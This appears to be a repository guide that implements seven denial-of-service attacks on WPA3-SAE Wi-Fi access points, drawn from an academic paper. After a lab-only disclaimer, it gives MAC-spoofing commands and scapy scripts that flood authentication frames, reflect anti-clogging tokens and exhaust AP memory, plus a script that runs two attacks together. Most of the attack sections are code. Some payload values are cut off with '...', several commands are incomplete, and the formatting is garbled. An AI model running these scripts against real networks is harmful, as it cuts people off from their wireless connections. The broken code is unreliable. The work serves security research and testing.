# 🛑 WPA3-SAE Denial-of-Service (DoS) Attacks: Practical Implementation Guide

![WPA3-SAE](https://img.shields.io/badge/Protocol-WPA3--SAE-informational) ![Research](https://img.shields.io/badge/Type-Security_Research-red) ![License](https://img.shields.io/badge/License-CC--BY--NC--4.0-lightgrey) ![Python](https://img.shields.io/badge/Python-3.x-blue)

## ⚠️ IMPORTANT LEGAL AND ETHICAL DISCLAIMER

> **🚫 This documentation is provided for educational, security testing, and academic research purposes only. Unauthorized access to computer networks is illegal. All testing must be conducted in a controlled, isolated lab environment using equipment you own. The authors are not responsible for any misuse of this information.**

---

## 📚 Table of Contents
1.  [Overview](#-overview)
2.  [Lab Setup Requirements](#-lab-setup-requirements)
3.  [Attack Documentation](#-attack-documentation)
4.  [Attack Comparison Table](#-attack-comparison-table)
5.  [General Setup & Tools](#-general-setup--tools)
6.  [Mitigations & References](#-mitigations--references)

---

## 🔍 Overview

This repository contains practical implementations of the seven (7) novel DoS attacks against WPA3-SAE (Simultaneous Authentication of Equals) documented in the academic paper *"How is your Wi-Fi connection today? DoS attacks on WPA3-SAE"* by Chatzoglou et al.

These attacks exploit implementation flaws and resource management weaknesses in WPA3-SAE, ranging from disconnecting specific users to completely crippling an Access Point (AP).

![Attack Overview](https://via.placeholder.com/800x200.png?text=WPA3-SAE+Attack+Flow+Diagram) *// Placeholder for diagram*

---

## 🧪 Lab Setup Requirements

-   **🔒 Isolated Network:** A dedicated Wi-Fi AP (e.g., a home router) with WPA3-SAE enabled, **disconnected from the Internet**.
-   **📱 Target Devices:** At least one or two client devices (e.g., smartphone, laptop) connected to the AP.
-   **💻 Attacker Machine:** A computer running Kali Linux or similar distribution.
-   **📶 Wireless Adapters:** Two wireless network interface controllers (WNICs) are recommended:
    -   **WNIC 1 (`wlan0`):** For monitor mode (packet capture). Must support packet injection.
    -   **WNIC 2 (`wlo1`):** For managed mode (sending attack frames and connection attempts).
-   **🛠️ Core Tools:** `aircrack-ng`, `macchanger`, `tshark`, `wpa_supplicant`, `scapy` (Python library).

---

## 🧨 Attack Documentation

### 1. Doppelganger Attack
**🎯 Goal:** Disconnect a specific target client or deny it internet access.
**💡 Concept:** Spoof the MAC address of a connected client and authenticate with the correct password, confusing the AP.

**🛠️ Implementation:**
```bash
# Step 1: Identify target client and AP BSSID
sudo airodump-ng wlan0mon

# Step 2: Spoof the target's MAC address
sudo ip link set wlo1 down
sudo macchanger -m  # Use target's MAC
sudo ip link set wlo1 up

nano test_sae.conf

📁 Configuration File (test_sae.conf):
bash

ctrl_interface=/var/run/wpa_supplicant
update_config=1
ap_scan=1

network={
    ssid=""
    bssid= # AP's MAC address
    scan_ssid=1
    key_mgmt=SAE
    psk="CorrectWiFiPassword" # The network's password
    ieee80211w=2
}

# Step 3: Attempt authentication
sudo systemctl stop NetworkManager
sudo wpa_supplicant -c test_sae.conf -i wlo1 - d


### 2. Cookie Guzzler Attack

## 🎯 Goal: Overwhelm AP's CPU by triggering anti-clogging mechanism

## 🐍 Python Code (cookie_guzzler.py):
python

from scapy.all import *
import random

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255))

bssid = "EC:75:0C:ED:83:E2"
group = b"\x13\x00"
scalar = b"\xfe\xa0\x7e\xb5\x65\xb4\x00\x57..."
finite = b"\x69\x42\x1d\x7a\xfc\x4a\x65\x22..."

while True:
    client_mac = rand_mac()
    frame = RadioTap() / \
            Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
            Dot11Auth(algo=3, seqnum=1, status=0) / \
            group / scalar / finite
    sendp(frame, iface="wlo1", verbose=0)

3. PMK Gobbler Attack

🎯 Goal: Exhaust AP resources by forcing PMK generation

🐍 Python Code (pmk_gobbler.py):
python

from scapy.all import *
import subprocess
import time

bssid = "EC:75:0C:ED:83:E2"
group = b"\x13\x00"
scalar = b"..."; finite = b"..."

def capture_cookies(duration=10):
    cmd = f"sudo tshark -i wlan0mon -Y 'wlan.fixed.anti_clogging_token' -T fields -e wlan.fixed.anti_clogging_token -e wlan.sa -a duration:{duration}"
    result = subprocess.check_output(cmd, shell=True).decode()
    return result.splitlines()

def reflect_cookie(token, mac):
    frame = RadioTap() / \
            Dot11(addr1=bssid, addr2=mac, addr3=bssid) / \
            Dot11Auth(algo=3, seqnum=1, status=0) / \
            group / bytes.fromhex(token) / scalar / finite
    sendp(frame, iface="wlo1", verbose=0)

captured_data = capture_cookies(60)
for line in captured_data:
    if line:
        parts = line.split()
        if len(parts) >= 2:
            token, mac = parts[0], parts[1]
            reflect_cookie(token, mac)
            time.sleep(0.1)

4. Memory Omnivore Attack

🎯 Goal: Consume AP's memory with half-open sessions

🐍 Python Code (memory_omnivore.py):
python

from scapy.all import *
import itertools
import time

bssid = "EC:75:0C:ED:83:E2"
group = b"\x13\x00"
scalar = b"..."; finite = b"..."

mac_pool = ["7C:D2:DA:BB:37:B8", "D6:E2:F7:98:36:8E", 
           "90:4C:C5:D9:58:4A", "AA:BB:CC:DD:EE:FF"]

for mac in itertools.cycle(mac_pool):
    frame = RadioTap() / \
            Dot11(addr1=bssid, addr2=mac, addr3=bssid) / \
            Dot11Auth(algo=3, seqnum=1, status=0) / \
            group / scalar / finite
    sendp(frame, iface="wlo1", verbose=0)
    time.sleep(0.1)

5. Double-Decker Attack

🎯 Goal: Combine attacks for maximum impact

📜 Bash Script (double_decker.sh):
bash

#!/bin/bash
python3 memory_omnivore.py &
PID_MEM=$!

python3 cookie_guzzler.py &
PID_COOKIE=$!

sleep 180

kill $PID_MEM $PID_COOKIE

6. Amplification Attack

🎯 Goal: Amplify DoS using other network devices

🐍 Python Code (amplification.py):
python

from scapy.all import *
import time

bssid = "EC:75:0C:ED:83:E2"
group = b"\x13\x00"
scalar = b"..."; finite = b"..."

spoofed_macs = ["C4:AB:CD:EF:12:34", "D8:AC:DE:F1:23:45", "11:22:33:44:55:66"]

for victim_mac in spoofed_macs:
    frame = RadioTap() / \
            Dot11(addr1=bssid, addr2=victim_mac, addr3=bssid) / \
            Dot11Auth(algo=3, seqnum=1, status=0) / \
            group / scalar / finite
    sendp(frame, iface="wlo1", verbose=0)
    time.sleep(0.05)

7. Open Authentication Attack

🎯 Goal: Flood with legacy Open Authentication requests

🐍 Python Code (open_auth.py):
python

from scapy.all import *
import random

def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255))

bssid = "EC:75:0C:ED:83:E2"

while True:
    client_mac = rand_mac()
    frame = RadioTap() / \
            Dot11(addr1=bssid, addr2=client_mac, addr3=bssid) / \
            Dot11Auth(algo=0, seqnum=1, status=0)
    sendp(frame, iface="wlo1", verbose=0, count=10)
    time.sleep(0.01)






